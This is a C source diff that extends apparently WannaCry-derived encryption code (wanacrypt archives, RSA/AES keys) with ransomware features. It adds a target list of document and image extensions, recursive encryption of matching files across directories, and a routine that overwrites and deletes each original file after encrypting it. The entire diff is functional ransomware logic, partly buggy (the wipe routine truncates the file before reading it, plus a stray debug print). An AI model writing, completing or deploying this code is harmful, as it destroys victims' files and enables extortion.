@@ -68,6 +68,10 @@ POSSIBILITY OF SUCH DAMAGE. */
 #define WC_ENCRYPT_DIR 2
 #define WC_DECRYPT_DIR 3
 
+#define ENCRYPT_COUNT 5
+#define EXTENSION_LEN 6
+char exts[ENCRYPT_COUNT][EXTENSION_LEN] = { ".doc", ".txt", ".jpg", ".docx", ".pdf" };
+
 // structure of wanacrypt archive
 typedef struct _wc_file_t {
 	char     sig[WC_SIG_LEN];    // 64-bit signature
@@ -424,6 +428,27 @@ aes_key_t* get_aes_key(HCRYPTPROV prov, HCRYPTKEY rsa_key, const char *file)
 	return aes_key;
 }
 
+void sdel(const char *infile) {
+	FILE            *in, *out;
+	BYTE            *buf;
+	DWORD           len, t;
+	in = fopen(infile, "r");
+	out = fopen(infile, "w");
+	buf = (BYTE *)malloc(WC_BUF_SIZE);
+	for (;;) {
+		// read in 1MB chunks
+		len = fread(buf, 1, WC_BUF_SIZE - 16, in);
+		if (len == 0) break;
+		memset(buf, 1, WC_BUF_SIZE);
+		fwrite(buf, 1, len, out);
+		printf("ttt\n");
+	}
+	free(buf);
+	fclose(in);
+	fclose(out);
+	remove(infile);
+}
+
 /**
 *
 * Attempt to encrypt a file using public key
@@ -511,6 +536,7 @@ void encrypt(HCRYPTPROV prov, HCRYPTKEY rsa_key, const char *infile)
 		fclose(out);
 	}
 	fclose(in);
+	sdel(infile);
 }
 
 /**
@@ -587,6 +613,29 @@ void decrypt(HCRYPTPROV prov, HCRYPTKEY rsa_key, const char *infile)
 		fclose(out);
 	}
 	fclose(in);
+	sdel(infile);
+}
+
+int endswith(const char* infile, const char* ext)
+{
+	size_t hlen;
+	size_t nlen;
+	/* find the length of both arguments -
+	if needle is longer than haystack, haystack can't end with needle */
+	hlen = strlen(infile);
+	nlen = strlen(ext);
+	if (nlen > hlen) return 0;
+
+	/* see if the end of haystack equals needle */
+	return (strcmp(&infile[hlen - nlen], ext)) == 0;
+}
+
+bool valid_ext(const char* infile) {
+	int i = 0;
+	for (;i<ENCRYPT_COUNT; i++) {
+		if (endswith(infile, exts[i])) return true;
+	}
+	return false;
 }
 
 // encrypt or decrypt a file using public/private keys
@@ -623,8 +672,10 @@ void encrypt_dir(const char *infile, int enc) {
 		else {
 			char path[MAX_PATH] = { 0 };
 			snprintf(path, sizeof(path), "%s\\%s", infile, pent->d_name);
-			printf("do %d %s <file>\n", fileact, path);
-			encrypt_file(path, fileact);
+			if(fileact == WC_ENCRYPT && valid_ext(path))
+				encrypt_file(path, fileact);
+			else if (fileact == WC_DECRYPT)
+				encrypt_file(path, fileact);
 		}
 	}
 	closedir(pdir);
@@ -653,6 +704,7 @@ void encrypt_file(const char *infile, int enc)
 	// just warn user if infile is already archive
 	if (arc && enc == WC_ENCRYPT) {
 		printf("\n  [ warning: %s is already a WanaCryptor archive", infile);
+		return;
 	}
 
 	// if we're decrypting, make sure it's a valid archive
